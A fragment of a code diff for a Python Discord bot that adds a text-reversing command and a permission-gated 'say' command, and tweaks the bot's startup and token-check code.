+
+
+@bot.tree.command(name="reverse", description="Reverse a text.")
+@app_commands.describe(text="Text to reverse")
+async def reverse(interaction: discord.Interaction, text: str):
+    await interaction.response.send_message(text[::-1])
+
+
+@bot.tree.command(name="say", description="Make the bot say something.")
+@app_commands.default_permissions(manage_messages=True)
+@app_commands.describe(text="What to say")
+async def say(interaction: discord.Interaction, text: str):
+    await interaction.response.send_message("✅ Sent.", ephemeral=True)
+    await interaction.channel.send(text)
+
+
+# ==========================================================
+#                PREFIX .kill  (HIDDEN ONLY)
 # ==========================================================
 def owner_only_prefix():
     async def check(ctx):
@@ -2015,13 +2187,13 @@ async def kill(ctx: commands.Context):
 
 
 # ==========================================================
-# RUN
+#                       RUN BOT
 # ==========================================================
 if __name__ == "__main__":
     if not TOKEN:
         logger.critical(
             "DISCORD_TOKEN environment variable is not set. "
-            "Set it in your hosting panel (Bothost -> Переменные окружения)."
+            "Set it in your hosting panel (Bothost → Переменные окружения)."
         )
     else:
         bot.run(TOKEN)
